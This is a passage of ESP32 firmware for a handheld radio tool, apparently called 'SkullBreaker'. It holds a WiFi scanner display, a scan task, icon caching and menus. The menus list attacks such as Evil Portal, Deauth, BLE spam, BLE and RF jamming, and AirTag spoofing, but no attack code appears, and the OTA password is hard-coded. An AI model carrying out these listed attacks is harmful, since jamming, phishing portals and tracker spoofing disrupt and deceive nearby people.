    } else {
        tft.print("WiFi Scanner");
    }

    // Subtitle
    tft.setTextSize(1);
    tft.setTextColor(textSoft);
    tft.setCursor(18, 58);
    if (selectingAttackTargets) {
        tft.print("Selected: ");
        tft.print(attackTargetCount);
    } else {
        tft.print("Nearby networks");
    }
    tft.setCursor(146, 58);
    tft.print("Filter:");
    tft.print(wifiFilterLabel);

    // Count badge — show total count
    tft.fillRoundRect(186, 34, 40, 16, 4, tft.color565(40, 40, 40));
    tft.setTextColor(accent);
    tft.setCursor(190, 38);
    tft.print(wifiNetworkCount);

    if (wifiScanRunning || holdScanStatus) {
        if (millis() - lastAnim > 250) {
            lastAnim = millis();
            dots = (dots % 3) + 1;
        }
        tft.setTextColor(textSoft);
        tft.setCursor(18, 120);
        tft.print("Scanning");
        for (uint8_t i = 0; i < dots; i++) {
            tft.print(".");
        }
        tft.setCursor(18, 136);
        if (wifiScanStatus[0]) {
            tft.print(wifiScanStatus);
        } else {
            tft.print(selectingAttackTargets ? "Collecting targets..." : "Looking for nearby APs...");
        }
        // BUG FIX 1.5, 1.11, 1.14, 1.15, 1.16: Removed debug line display
        // if (wifiScanDebugLine[0]) {
        //     tft.setCursor(18, 152);
        //     tft.print(wifiScanDebugLine);
        // }
        if (wifiNetworkCount == 0) {
            tft.setTextSize(1);
            tft.setTextColor(textSoft);
            tft.setCursor(12, 278);
            tft.print("LEFT back");
            return;
        }
    } else if (wifiNetworkCount == 0) {
        tft.setTextColor(textSoft);
        tft.setCursor(18, 120);
        if (wifiScanLastRunFailed) {
            tft.print("WiFi scan needs attention");
        } else {
            tft.print(openOnlyFilter ? "No APs match filter" : "No APs yet");
        }
        tft.setCursor(18, 136);
        if (wifiScanStatus[0]) {
            tft.print(wifiScanStatus);
        } else {
            tft.print(openOnlyFilter ? "Filter: Open only" : "Try Rescan");
        }
        // BUG FIX 1.5, 1.11, 1.14, 1.15, 1.16: Removed debug line display
        // if (wifiScanDebugLine[0]) {
        //     tft.setCursor(18, 152);
        //     tft.print(wifiScanDebugLine);
        // }
    }

    // Draw list items
    for (int i = 0; i < visibleItems; i++) {
        int index = i + wifiScrollOffset;
        if (index >= totalItems) {
            // Clear empty row
            tft.fillRect(8, 78 + i * 38, 224, 34, bg);
            continue;
        }

        int y = 78 + i * 38;
        bool selected = (index == wifiSelectedIndex);

        tft.fillRoundRect(8, y, 224, 32, 4, selected ? rowSelected : rowFill);
        drawListSelectionFrame(8, y, 224, 32, selected, accent);

        tft.setTextSize(1);

        if (index == wifiNetworkCount) {
            // Rescan button
            tft.setTextColor(accent);
            tft.setCursor(14, y + 12);
            tft.print("Rescan");
            continue;
        }

        // SSID - preserve both the start and end so sibling SSIDs under one AP
        // like Facilities-Guest / Facilities-Main stay visually distinct.
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(14, y + 4);
        // Clear text area first to prevent garbled text
        tft.fillRect(14, y + 4, 150, 8, selected ? rowSelected : rowFill);
        char name[21];
        formatWiFiListSSID(wifiSSIDs[index], name, sizeof(name));
        tft.print(name);

        // Type hint / encryption + BSSID tail for same-name APs
        tft.setTextColor(textSoft);
        tft.setCursor(14, y + 16);
        // Clear text area first
        tft.fillRect(14, y + 16, 60, 8, selected ? rowSelected : rowFill);
        char detail[10];
        if (wifiHints[index][0]) {
            strncpy(detail, wifiHints[index], 9);
        } else {
            strncpy(detail, wifiEncStr[index], 9);
        }
        detail[9] = 0;
        tft.print(detail);

        char shortBSSID[9];
        formatWiFiListBSSID(wifiBSSID[index], shortBSSID, sizeof(shortBSSID));
        if (shortBSSID[0]) {
            tft.setCursor(76, y + 16);
            // Clear text area first
            tft.fillRect(76, y + 16, 80, 8, selected ? rowSelected : rowFill);
            tft.print(shortBSSID);
        }

        // Channel
        tft.setTextColor(textSoft);
        tft.setCursor(170, y + 4);
        // Clear text area first
        tft.fillRect(170, y + 4, 50, 8, selected ? rowSelected : rowFill);
        tft.print("Ch");
        tft.print(wifiChannel[index]);

        // RSSI + last-seen age
        tft.setCursor(162, y + 16);
        // Clear text area first
        tft.fillRect(162, y + 16, 35, 8, selected ? rowSelected : rowFill);
        tft.print(wifiRSSI[index]);
        tft.print("dB");

        // Last-seen age (far right, bottom)
        if (wifiLastSeen[index] > 0) {
            unsigned long ageSec = (millis() - wifiLastSeen[index]) / 1000UL;
            tft.setCursor(200, y + 16);
            // Clear text area first
            tft.fillRect(200, y + 16, 25, 8, selected ? rowSelected : rowFill);
            if (ageSec < 60) { tft.print(ageSec); tft.print("s"); }
            else             { tft.print(ageSec / 60); tft.print("m"); }
        }
    }

    // Instructions
    tft.setTextSize(1);
    tft.setTextColor(textSoft);
    tft.setCursor(12, 258);
    tft.print(wifiScanStatus);
    tft.setCursor(12, 278);
    // BUG FIX 1.5, 1.11, 1.14, 1.15, 1.16: Removed debug line display
    // if (wifiScanDebugLine[0]) {
    //     tft.print(wifiScanDebugLine);
    // } else 
    if (selectingAttackTargets) {
        tft.print("SEL select  LEFT back");
    } else {
        tft.print("UP/DN scroll  LEFT back");
    }
    tft.setCursor(12, 294);
    if (selectingAttackTargets) {
        tft.print("Choose AP family");
    } else {
        tft.print("SEL detail/rescan");
    }
}

float estimateDistance(int rssi) {
    int txPower = -50; // assumed
    float n = 2.0;     // environmental factor
    return pow(10.0, (txPower - rssi) / (10 * n));
}

// ===== SUBMENU SYSTEM =====
const char** currentMenu = nullptr;
int currentMenuSize = 0;
int currentMenuIndex = 0;
int currentMenuScrollOffset = 0;
int activeToolIndex = -1;
const char** submenuParentMenu = nullptr;
int submenuParentSize = 0;
int submenuParentIndex = 0;
int submenuParentScrollOffset = 0;
String submenuParentTitle = "";

// ===== SUBMENUS =====

// Top-level WiFi category menu
const char* wifiMenu[] = {
    "Sniffers",
    "Attacks",
    "Back"
};

// WiFi Attacks submenu
const char* wifiAttacksMenu[] = {
    "Evil Portal",
    "Rick Roll",
    "Probe Flood",
    "Deauth",
    "Bad Msg",
    "Ch Switch",
    "Quiet",
    "Assoc Sleep",
    "AP Clone",
    "Beacon",
    "Back"
};

// WiFi Sniffers submenu
const char* wifiSniffersMenu[] = {
    "Probe",
    "Beacon",
    "Deauth",
    "EAPOL/PMKID",
    "Raw Capture",
    "Station",
    "Signal Mon",
    "Ch Analyzer",
    "Scan All",
    "Pkt Count",
    "Pkt Monitor",
    "Scan APs",
    "Hidden SSID",
    "Back"
};




const char* bluetoothMenu[] = {
    "Sniffers",
    "BLE Attacks",
    "Back"
};

const char* bleAttacksMenu[] = {
    "Sour Apple",
    "SwiftPair",
    "Samsung",
    "Beacon",
    "BT Spam All",
    "BLE Jammer",
    "BLE Spoofer",
    "AirTag Spoof",
    "Back"
};

const char* bluetoothSniffersMenu[] = {
    "Analyzer",
    "Sniffer",
    "Card Skimmers",
    "Flipper",
    "AirTag",
    "Manufacturer",
    "Back"
};

const char* bluetoothManufacturerMenu[] = {
    "Flock",
    "Apple",
    "Android/Google",
    "Samsung",
    "Microsoft",
    "Tile",
    "Ring",
    "Fitbit",
    "Garmin",
    "Sony",
    "Bose",
    "Xiaomi",
    "Meta",
    "Amazon",
    "Belkin",
    "Infrastructure",
    "Back"
};

const char* ghzMenu[] = {
    "Sniffers",
    "Attacks",
    "Back"
};

const char* ghzSniffersMenu[] = {
    "Scanner",
    "Noise",
    "Protocol",
    "Back"
};

const char* ghzAttacksMenu[] = {
    "Jammer",
    "Pkt Flood",
    "Back"
};

const char* rfMenu[] = {
    "Sniffers",
    "Transmit",
    "Back"
};

const char* rfSniffersMenu[] = {
    "Scan",
    "Monitor",
    "Raw Capture",
    "Remote Capture",
    "Sweep",
    "Roll Capture",
    "Back"
};

const char* rfTransmitMenu[] = {
    "Jam",
    "TX",
    "Squelch",
    "Back"
};

const char* settingsMenu[] = {
    "WiFi",
    "Storage",
    "Screensaver",
    "Brightness",
    "OTA",
    "Info",
    "Reboot",
    "Back"
};

const char* storageSettingsMenu[] = {
    "SD Info",
    "Mount SD",
    "Unmount SD",
    "Format SD",
    "Back"
};

const char* wifiSettingsMenu[] = {
    "EP HTML",
    "EP Name",
    "Back"
};

const char* screenSaverMenu[] = {
    "Timeout",
    "Style",
    "Back"
};

const char* brightnessMenu[] = {
    "Level",
    "Back"
};

void wifiTask(void * parameter) {

    while (true) {

        if (radioLocked || isBLEMode(currentRadioMode)) {
            vTaskDelay(200 / portTICK_PERIOD_MS);
            continue;
        }

        // 🔥 BLOCK WHEN BLE IS USING RADIO
        if (currentRadioMode == WIFI_SCAN && wifiScanRunning) {
            if (wifiScanReadyAt != 0 && millis() < wifiScanReadyAt) {
                vTaskDelay(80 / portTICK_PERIOD_MS);
                continue;
            }
            wifiScanReadyAt = 0;
            setWiFiScanStatus("Scanning WiFi");

            LOG_IF(DEBUG_VERBOSE_SCANS, "TASK: scanning...");
            releaseTransientIconHeapForMode("WiFi");

            resetWiFi();

            if (!WiFi.mode(WIFI_STA)) {
                LOG("TASK: failed to enter WIFI_STA");
                wifiScanRunning = false;
                setWiFiScanStatus("WiFi init failed", true);
                wifiNeedsRedraw = true;
                vTaskDelay(300 / portTICK_PERIOD_MS);
                continue;
            }

            WiFi.disconnect(false, false);
            vTaskDelay(120 / portTICK_PERIOD_MS);

            // Active scan — sends probe requests, catches hidden SSIDs and weak APs
            WiFi.setScanMethod(WIFI_ALL_CHANNEL_SCAN);  // scan all channels, not just first match
            WiFi.setSortMethod(WIFI_CONNECT_AP_BY_SIGNAL);
            int n = WiFi.scanNetworks(false, true);  // async=false, show_hidden=true
            if (n < 0) {
                LOG("TASK: scanNetworks returned " + String(n));
                setWiFiScanStatus("WiFi scan failed", true);
                n = 0;
            }

            int count = 0;
            clearWiFiScanResults();

            for (int i = 0; i < n; i++) {

                String enc = "?";

                switch (WiFi.encryptionType(i)) {
                    case WIFI_AUTH_OPEN:          enc = "OPEN";    break;
                    case WIFI_AUTH_WEP:           enc = "WEP";     break;
                    case WIFI_AUTH_WPA_PSK:       enc = "WPA";     break;
                    case WIFI_AUTH_WPA2_PSK:      enc = "WPA2";    break;
                    case WIFI_AUTH_WPA_WPA2_PSK:  enc = "WPA/2";   break;
                    case WIFI_AUTH_WPA2_ENTERPRISE: enc = "WPA2E"; break;
                    case WIFI_AUTH_WPA3_PSK:      enc = "WPA3";    break;
                    case WIFI_AUTH_WPA2_WPA3_PSK: enc = "WPA2/3";  break;
                    default: enc = "ENC"; break;
                }

                String rawSsid = WiFi.SSID(i);
                String rawBssid = WiFi.BSSIDstr(i);
                int rawChannel = WiFi.channel(i);
                int rawRssi = WiFi.RSSI(i);

                setWiFiScanDebug(rawSsid, rawBssid, rawChannel, rawRssi);
                LOG_IF(DEBUG_VERBOSE_SCANS,
                       "WIFI RAW[" + String(i) + "] SSID='" +
                       (rawSsid.length() ? rawSsid : String("(hidden)")) +
                       "' BSSID=" + rawBssid +
                       " CH=" + String(rawChannel) +
                       " RSSI=" + String(rawRssi));

                storeWiFiNetworkResult(
                    rawSsid,
                    rawBssid,
                    rawChannel,
                    rawRssi,
                    enc,
                    count
                );

                if ((i & 0x03) == 0x03) {
                    yield();
                }
            }

            wifiNetworkCount = count;
            sortWiFiResultsByRSSI();

            LOG("TASK: deduped networks = " + String(count));
            if (count > 0) {
                // WiFi auto-save removed — only BLE saves to SD
            }

            if (count == 0 && wifiScanWarmupRetries > 0) {
                wifiScanWarmupRetries--;
                LOG("TASK: WiFi warmup retry -> " + String(wifiScanWarmupRetries));
                wifiScanRunning = true;
                wifiScanReadyAt = millis() + 520UL;
                wifiScanKeepStatusUntil = millis() + 1400UL;
                setWiFiScanStatus("Retrying scan");
                wifiNeedsRedraw = true;
                vTaskDelay(120 / portTICK_PERIOD_MS);
                continue;
            }

            wifiScanAutoRetryPending = false;
            wifiScanWarmupRetries = 0;
            wifiScanRunning = false;
            wifiScanKeepStatusUntil = (count == 0) ? millis() + 900UL : 0;
            if (count > 0) {
                char statusLine[32];
                snprintf(statusLine, sizeof(statusLine), "%d AP%s seen",
                         count, count == 1 ? "" : "s");
                setWiFiScanStatus(statusLine);
            } else if (orionToolsWifiOpenOnly()) {
                setWiFiScanStatus("Open-only filter active");
            } else {
                setWiFiScanStatus("No APs found");
            }
            wifiNeedsRedraw = true;
        }

        vTaskDelay(300 / portTICK_PERIOD_MS);
    }
}
// ===== SUBMENU ICONS =====
// Placeholder icons for now. Replace later with custom ones.
const char* wifiIcons[] = {
    "/icons/wifi.bin",
    "/icons/wifi.bin",
    "/icons/back.bin"
};

const char* wifiAttacksIcons[] = {
    "/icons/wifi.bin",      // Evil Portal
    "/icons/wifi.bin",      // Rick Roll
    "/icons/wifi.bin",      // Probe Flood
    "/icons/wifi.bin",      // Deauth Flood
    "/icons/wifi.bin",      // Bad Msg
    "/icons/wifi.bin",      // Channel Switch
    "/icons/wifi.bin",      // Quiet Attack
    "/icons/wifi.bin",      // Assoc Sleep
    "/icons/wifi.bin",      // AP Clone Spam
    "/icons/wifi.bin",      // Beacon Spammer
    "/icons/back.bin"
};

const char* wifiSniffersIcons[] = {
    "/icons/wifi.bin",      // Probe Sniff
    "/icons/wifi.bin",      // Beacon Sniff
    "/icons/wifi.bin",      // Deauth Sniff
    "/icons/wifi.bin",      // EAPOL/PMKID
    "/icons/wifi.bin",      // Raw Capture
    "/icons/wifi.bin",      // Station Sniff
    "/icons/channel_scanner.bin", // Signal Monitor
    "/icons/channel_scanner.bin", // Channel Analyzer
    "/icons/wifi.bin",      // Scan All
    "/icons/wifi.bin",      // Packet Count
    "/icons/packet_monitor.bin",  // Packet Monitor
    "/icons/wifi.bin",      // Scan APs
    "/icons/wifi.bin",      // Hidden SSID
    "/icons/back.bin"
};




const char* bluetoothIcons[] = {
    "/icons/ble_scanner.bin",
    "/icons/bluetooth.bin",  // BLE Attacks
    "/icons/back.bin"
};

const char* bleAttacksIcons[] = {
    "/icons/bluetooth.bin",  // Sour Apple
    "/icons/bluetooth.bin",  // SwiftPair
    "/icons/bluetooth.bin",  // Samsung
    "/icons/bluetooth.bin",  // Beacon Spam
    "/icons/bluetooth.bin",  // BT Spam All
    "/icons/bluetooth.bin",  // BLE Jammer
    "/icons/bluetooth.bin",  // BLE Spoofer
    "/icons/bluetooth.bin",  // Rubber Ducky
    "/icons/bluetooth.bin",  // AirTag Spoof
    "/icons/back.bin"
};

const char* bluetoothSniffersIcons[] = {
    "/icons/ble_scanner.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/back.bin"
};

const char* bluetoothManufacturerIcons[] = {
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/bluetooth.bin",
    "/icons/back.bin"
};

const char* ghzIcons[] = {
    "/icons/rf_scanner.bin",
    "/icons/rf_jammer.bin",
    "/icons/back.bin"
};

const char* ghzSniffersIcons[] = {
    "/icons/channel_scanner.bin",
    "/icons/noise_analyzer.bin",
    "/icons/rf24_test.bin",
    "/icons/rf24_test.bin",
    "/icons/rf24_test.bin",
    "/icons/rf24_test.bin",
    "/icons/rf24_test.bin",
    "/icons/rf24_test.bin",
    "/icons/back.bin"
};

const char* ghzAttacksIcons[] = {
    "/icons/rf24_test.bin",
    "/icons/back.bin"
};

const char* rfIcons[] = {
    "/icons/rf_scanner.bin",
    "/icons/rf_transmit.bin",
    "/icons/back.bin"
};

const char* rfSniffersIcons[] = {
    "/icons/rf_scanner.bin",
    "/icons/rf_monitor.bin",
    "/icons/signal_capture.bin",
    "/icons/rf_transmit.bin",
    "/icons/frequency_sweep.bin",
    "/icons/signal_capture.bin",  // Roll Capture
    "/icons/back.bin"
};

const char* rfTransmitIcons[] = {
    "/icons/rf_jammer.bin",
    "/icons/rf_transmit.bin",
    "/icons/rf_transmit.bin",  // Using rf_transmit for squelch (squelch.bin may not exist)
    "/icons/back.bin"
};

const char* settingsIcons[] = {
    "/icons/wifi.bin",         // WiFi Settings
    "/icons/sd.bin",           // Storage
    "/icons/system.bin",       // Screensaver
    "/icons/system.bin",       // Brightness
    "/icons/wifi.bin",         // OTA
    "/icons/system.bin",       // System Info
    "/icons/reboot.bin",       // Reboot
    "/icons/back.bin"          // Back
};

const char* wifiSettingsIcons[] = {
    "/icons/sd.bin",           // Select EP HTML
    "/icons/wifi.bin",         // Rename EP AP
    "/icons/back.bin"          // Back
};

const char* storageSettingsIcons[] = {
    "/icons/sd.bin",           // SD Info
    "/icons/sd_mount.bin",     // Mount SD
    "/icons/sd_unmount.bin",   // Unmount SD
    "/icons/sd_format.bin",    // Format SD
    "/icons/back.bin"          // Back
};

const char* screenSaverIcons[] = {
    "/icons/system.bin",       // Saver Time
    "/icons/system.bin",       // Saver Style
    "/icons/back.bin"          // Back
};

const char* brightnessIcons[] = {
    "/icons/system.bin",
    "/icons/back.bin"
};

WiFiServer* wirelessUpdateServer = nullptr;
bool wirelessUpdateActive = false;
bool wirelessUpdateNeedsRedraw = false;
String wirelessUpdateSSID = "SkullBreaker-Update";
String wirelessUpdatePassword = "skullota";
String wirelessUpdateIP = "192.168.4.1";
String wirelessUpdateStatus = "Idle";

// ===== FUNCTION DECLARATIONS =====
void drawStatusBar();
void drawUI();
void drawTile(int x, int y, const char* label, int iconType, bool selected);
void handleInput();
void redrawTileByIndex(int index, bool selected);
void drawIconFromFS(int x, int y, const char* path);
void drawIconFromFSColored(int x, int y, const char* path, uint16_t color, int size);
void drawScaledIconFromFS(int x, int y, const char* path, int rawSize, int step);
void drawScaledIconFromFSColored(int x, int y, const char* path, int rawSize, int step, uint16_t color);
const uint16_t* getCachedIconData(const char* path, int expectedSize);
const char* getIconFallbackPath(const char* path);
bool isPressed(int pin);
int waterfallY = SCANNER_WATERFALL_START_Y;
void handleSubMenuInput();
void drawSubMenuItem(int i, bool selected);
const char** getCurrentIconArray();
bool currentMenuHasIcons();
bool isMenuItemDisabled(int index);
void moveToNextSelectable(int dir);

void handleToolInput();
void runBLERadar();
void drawBLERadar();
void runBLELogger();
void drawBLELogger();
void runBLELoggerPicker();
void stopBLERadar();
void stopBLELogger();
void drawWiFiDetail();
void drawBLEDetail();

void handleSystemInfoInput();


void drawSystemInfoScreen();
const char* getRadioModeLabel(RadioMode mode);
bool toolNeedsHighHeap(RadioMode mode);
bool canEnterToolMode(RadioMode mode, const char** reasonOut = nullptr);
void drawToolBlockedScreen(const char* title, const char* reason, const char* detail = nullptr);
ToolGuardState* getToolGuardState(RadioMode mode);
void markToolInitFailure(RadioMode mode, const char* reason, unsigned long blockMs = 8000UL);
void clearToolGuardFailure(RadioMode mode);
void logHeapTelemetry(const char* scope);
bool shouldFullyShutdownWiFiOnExit(RadioMode mode);
bool isPinnedIconPath(const String& path);
void handleSystemInfoInput();
void drawListSelectionFrame(int x, int y, int w, int h, bool selected, uint16_t accent);

void listFiles();
void playBootAnimation();

bool mountSD(bool redrawMenu, bool rememberChoice, bool autoTriggered, const char* callerContext);
void unmountSD(bool redrawMenu);
void logToSD(String message);

void drawStatusLine(int y, const char* label, const char* value, uint16_t valueColor);
const uint16_t* cacheIconAlias(const char* path, int expectedSize, const uint16_t* pixels);
const uint16_t* loadIconFallback(const char* path, int expectedSize, const char* reason);
void releaseIconCacheMemory();
const uint16_t* loadScratchIconData(const char* path, int expectedSize);
bool ensureIconCacheTable();

bool ensureIconCacheTable() {
    if (iconCache != nullptr) {
        return true;
    }

    iconCache = new IconCacheEntry[ICON_CACHE_MAX];
    return iconCache != nullptr;
}

const uint16_t* getCachedIconData(const char* path, int expectedSize) {
    if (!flashFsReady || path == nullptr || expectedSize <= 0) {
        return nullptr;
    }

    if (!ensureIconCacheTable()) {
        return loadScratchIconData(path, expectedSize);
    }

    for (int i = 0; i < iconCacheCount; i++) {
        if (iconCache[i].path.equals(path) && iconCache[i].size == expectedSize) {
            return iconCache[i].pixels;
        }
    }

    if (iconCacheCount >= ICON_CACHE_MAX) {
        return loadScratchIconData(path, expectedSize);
    }

    File file = LittleFS.open(path);
    if (!file) {
        LOG(String("Icon missing: ") + path);
        return loadIconFallback(path, expectedSize, "missing");
    }

    const int pixelCount = expectedSize * expectedSize;
    const int byteCount = pixelCount * 2;
    size_t fileSize = file.size();
    if ((int)fileSize != byteCount) {
        file.close();
        return loadIconFallback(path, expectedSize, "size_mismatch");
    }

    uint16_t* buffer = (uint16_t*)malloc(byteCount);
    if (!buffer) {
        file.close();
        return loadScratchIconData(path, expectedSize);
    }

    int readBytes = file.read((uint8_t*)buffer, byteCount);
    file.close();
    if (readBytes != byteCount) {
        free(buffer);
        return loadIconFallback(path, expectedSize, "read_mismatch");
    }

    for (int i = 0; i < pixelCount; i++) {
        buffer[i] = (buffer[i] << 8) | (buffer[i] >> 8);
    }

    iconCache[iconCacheCount].path = path;
    iconCache[iconCacheCount].size = expectedSize;
    iconCache[iconCacheCount].pixels = buffer;
    iconCache[iconCacheCount].ownsPixels = true;
    iconCache[iconCacheCount].pinned = isPinnedIconPath(path);
    iconCacheCount++;
    LOG_IF(DEBUG_VERBOSE_ICONS, String("Icon cached: ") + path + " size=" + String(expectedSize) + " slot=" + String(iconCacheCount - 1));
    return buffer;
}

const uint16_t* cacheIconAlias(const char* path, int expectedSize, const uint16_t* pixels) {
    if (path == nullptr || pixels == nullptr) {
        return nullptr;
    }

    if (!ensureIconCacheTable()) {
        return pixels;
    }

    if (iconCacheCount >= ICON_CACHE_MAX) {
        LOG(String("Icon cache full: ") + path + " count=" + String(iconCacheCount));
        return pixels;
    }

    iconCache[iconCacheCount].path = path;
    iconCache[iconCacheCount].size = expectedSize;
    iconCache[iconCacheCount].pixels = const_cast<uint16_t*>(pixels);
    iconCache[iconCacheCount].ownsPixels = false;
    iconCache[iconCacheCount].pinned = isPinnedIconPath(path);
    iconCacheCount++;
    return pixels;
}

void releaseIconCacheMemory() {
    if (iconCache == nullptr) {
        iconCacheCount = 0;
        return;
    }

    if (iconCacheCount <= 0) {
        return;
    }

    int freedEntries = 0;
    int keptEntries = 0;
    for (int i = 0; i < iconCacheCount; i++) {
        if (iconCache[i].pinned && iconCache[i].pixels != nullptr) {
            if (keptEntries != i) {
                iconCache[keptEntries] = iconCache[i];
            }
            keptEntries++;
            continue;
        }

        if (iconCache[i].ownsPixels && iconCache[i].pixels != nullptr) {
            free(iconCache[i].pixels);
            freedEntries++;
        }
        iconCache[i].path = "";
        iconCache[i].size = 0;
        iconCache[i].pixels = nullptr;
        iconCache[i].ownsPixels = false;
        iconCache[i].pinned = false;
    }

    for (int i = keptEntries; i < iconCacheCount; i++) {
        if (iconCache[i].pinned) {
            continue;
        }
        iconCache[i].path = "";
        iconCache[i].size = 0;
        iconCache[i].pixels = nullptr;
        iconCache[i].ownsPixels = false;
        iconCache[i].pinned = false;
    }

    iconCacheCount = keptEntries;
    LOG(String("Icon cache released entries=") + String(freedEntries) +
        " kept=" + String(keptEntries));
}

const uint16_t* loadScratchIconData(const char* path, int expectedSize) {
    static uint16_t scratch36[36 * 36];

    if (!flashFsReady || path == nullptr || expectedSize <= 0 || expectedSize > 36) {
        return nullptr;
    }

    const char* candidatePaths[2] = { path, getIconFallbackPath(path) };
    for (int candidateIndex = 0; candidateIndex < 2; candidateIndex++) {
        const char* candidate = candidatePaths[candidateIndex];
        if (candidate == nullptr) {
            continue;
        }

    File file = LittleFS.open(candidate);
        if (!file) {
            continue;
        }

        const int pixelCount = expectedSize * expectedSize;
        const int byteCount = pixelCount * 2;
        if ((int)file.size() != byteCount) {
            file.close();
            continue;
        }

        int readBytes = file.read((uint8_t*)scratch36, byteCount);
        file.close();
        if (readBytes != byteCount) {
            continue;
        }

        for (int i = 0; i < pixelCount; i++) {
            scratch36[i] = (scratch36[i] << 8) | (scratch36[i] >> 8);
        }

        return scratch36;
    }

    return nullptr;
}

const uint16_t* loadIconFallback(const char* path, int expectedSize, const char* reason) {
    const char* fallbackPath = getIconFallbackPath(path);
    if (fallbackPath == nullptr) {
        if (reason != nullptr) {
            LOG(String("Icon load failed: ") + path + " reason=" + reason);
        }
        return nullptr;
    }

    LOG(String("Icon fallback: ") + path + " -> " + fallbackPath);
    const uint16_t* fallbackPixels = getCachedIconData(fallbackPath, expectedSize);
    if (!fallbackPixels) {
        return nullptr;
    }

    return cacheIconAlias(path, expectedSize, fallbackPixels);
}

const char* getIconFallbackPath(const char* path) {
    if (path == nullptr) {
        return nullptr;
    }

    String lowerPath = path;
    lowerPath.toLowerCase();

    if (strcmp(path, "/icons/packet_monitor.bin") == 0 ||
        strcmp(path, "/icons/beacon_spammer.bin") == 0 ||
        strcmp(path, "/icons/wifiscan.bin") == 0) {
        return "/icons/wifi.bin";
    }

    if (strcmp(path, "/icons/ble_scanner.bin") == 0 ||
        strcmp(path, "/icons/ble_device.bin") == 0 ||
        strcmp(path, "/icons/ble_radar.bin") == 0 ||
        strcmp(path, "/icons/signal_logger.bin") == 0) {
        return "/icons/bluetooth.bin";
    }

    if (strcmp(path, "/icons/channel_scanner.bin") == 0 ||
        strcmp(path, "/icons/noise_analyzer.bin") == 0 ||
        strcmp(path, "/icons/rf24_test.bin") == 0) {
        return "/icons/ghz24.bin";
    }

    if (strcmp(path, "/icons/rf_scanner.bin") == 0 ||
        strcmp(path, "/icons/rf_monitor.bin") == 0 ||
        strcmp(path, "/icons/signal_capture.bin") == 0 ||
        strcmp(path, "/icons/frequency_sweep.bin") == 0 ||
        strcmp(path, "/icons/rf_transmit.bin") == 0) {
        return "/icons/rf.bin";
    }

    if (strcmp(path, "/icons/sd_mount.bin") == 0 ||
        strcmp(path, "/icons/sd_unmount.bin") == 0 ||
        strcmp(path, "/icons/sd_format.bin") == 0 ||
        strcmp(path, "/icons/system.bin") == 0 ||
        strcmp(path, "/icons/reboot.bin") == 0) {
        return "/icons/settings.bin";
    }

    if (lowerPath.startsWith("/icons/back")) {
        return "/icons/back.bin";
    }

    if (lowerPath.startsWith("/icons/ble") || lowerPath.indexOf("bluetooth") >= 0) {
        return "/icons/bluetooth.bin";
    }

    if (lowerPath.startsWith("/icons/wifi") || lowerPath.indexOf("beacon") >= 0 ||
        lowerPath.indexOf("packet_monitor") >= 0 || lowerPath.indexOf("wifiscan") >= 0) {
        return "/icons/wifi.bin";
    }

    if (lowerPath.indexOf("ghz24") >= 0 || lowerPath.indexOf("rf24") >= 0 ||
        lowerPath.indexOf("channel") >= 0 || lowerPath.indexOf("noise") >= 0) {
        return "/icons/ghz24.bin";
    }

    if (lowerPath.startsWith("/icons/sd") || lowerPath.indexOf("settings") >= 0 ||
        lowerPath.indexOf("system") >= 0 || lowerPath.indexOf("reboot") >= 0) {
        return "/icons/settings.bin";
    }

    if (lowerPath.startsWith("/icons/rf") || lowerPath.indexOf("squelch") >= 0 ||
        lowerPath.indexOf("weather") >= 0 || lowerPath.indexOf("roll") >= 0 ||
        lowerPath.indexOf("sweep") >= 0 || lowerPath.indexOf("jam") >= 0 ||
        lowerPath.indexOf("monitor") >= 0 || lowerPath.indexOf("transmit") >= 0 ||
        lowerPath.indexOf("capture") >= 0) {
        return "/icons/rf.bin";
    }

    return nullptr;
}

void initializeSystemClockFromBuild() {
    time_t now = time(nullptr);
    if (now > 1700000000) {
        return;
    }

    char monthText[4] = {0};
    int day = 1;
    int year = 2026;
    int hour = 0;
    int minute = 0;
    int second = 0;

    sscanf(__DATE__, "%3s %d %d", monthText, &day, &year);
    sscanf(__TIME__, "%d:%d:%d", &hour, &minute, &second);

    const char* monthNames[] = {
        "Jan", "Feb", "Mar", "Apr", "May", "Jun",
        "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
    };

    int monthIndex = 0;
    for (int i = 0; i < 12; i++) {
        if (strncmp(monthText, monthNames[i], 3) == 0) {
            monthIndex = i;
            break;
        }
    }

    struct tm buildTm = {};
    buildTm.tm_year = year - 1900;
    buildTm.tm_mon = monthIndex;
    buildTm.tm_mday = day;
    buildTm.tm_hour = hour;
    buildTm.tm_min = minute;
    buildTm.tm_sec = second;

    time_t buildEpoch = mktime(&buildTm);
    if (buildEpoch > 0) {
        struct timeval tv = {};
        tv.tv_sec = buildEpoch;
        settimeofday(&tv, nullptr);
    }
}

bool isBLEMode(RadioMode mode) {
    return mode == BLE_SCAN ||
           mode == BLE_BEACON_SPAM ||
           mode == BLE_BEACON_TEST ||
           mode == BLE_DEVICE_STABLE ||
           mode == BLE_RADAR ||
           mode == BLE_SIGNAL_LOGGER_PICK ||
           mode == BLE_SIGNAL_LOGGER ||
           mode == BLE_ATTACK_SOUR_APPLE ||
           mode == BLE_ATTACK_SWIFTPAIR ||
           mode == BLE_ATTACK_SAMSUNG ||
           mode == BLE_ATTACK_BEACON_SPAM ||
           mode == BLE_ATTACK_SPAM_ALL ||
           mode == BLE_JAMMER ||
           mode == BLE_SPOOFER ||
           mode == BLE_AIRTAG_SPOOF;
}

bool isWiFiMode(RadioMode mode) {
    return mode == WIFI_SCAN ||
           mode == WIFI_PACKET_MONITOR ||
           mode == WIFI_BEACON ||
           mode == WIFI_DETECTOR ||
           mode == WIFI_PROBE_SNIFF ||
           mode == WIFI_BEACON_SNIFF ||
           mode == WIFI_DEAUTH_SNIFF ||
           mode == WIFI_EAPOL_SCAN ||
           mode == WIFI_RAW_CAPTURE ||
           mode == WIFI_STATION_SNIFF ||
           mode == WIFI_SIGNAL_MONITOR ||
